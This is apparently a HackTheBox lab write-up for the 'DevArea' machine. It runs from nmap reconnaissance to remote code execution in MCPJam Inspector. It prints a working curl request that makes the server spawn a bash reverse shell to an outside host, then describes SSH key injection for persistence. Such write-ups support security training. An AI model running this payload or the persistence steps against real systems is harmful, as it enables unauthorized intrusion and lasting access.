# HackTheBox DevArea Full Chain Penetration Testing

## External Reconnaissance and Web Entry
- Network Mapping:
	- `nmap` scan of `10.129.18.105` indentified host as `devhub.htb`
 	- `nmap` scan of `10.129.18.105` indentified open ports: 22, 88, 6274
  
# Web reconnaissance
- Vulnerability Analysis: Identifying an outdated version of MCPJam Inspector v1.4.2 on `http://devhub:6274.htb`
- CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
- Payload Delivery: Utilizing curl to inject a malicious JSON configuration into the /api/mcp/connect endpoint.

## Reverse shell
		curl http://devhub.htb:6274/api/mcp/connect \
  	-H "Content-Type: application/json" \
  	-d '{
  		"serverConfig": {
  			"command":"/bin/bash",
  			"args":["-c", "bash -i >& /dev/tcp/10.10.14.126/4444 0>&1"],
  			"env":{}
  		},
  		"serverId":"rev_shell"
  	}'
			
Establishing a callback to `10.10.14.126:4444` via bash interactive shell.

## Persistence and Stabilization
- SSH Key Injection: Generating and hosting a public RSA key via a local HTTP server.
- Credential Placement: Deploying the public key into the target user’s `.ssh/authorized_keys` directory.
- Stable Connection: Establishing a persistent SSH session to replace the volatile reverse shell.
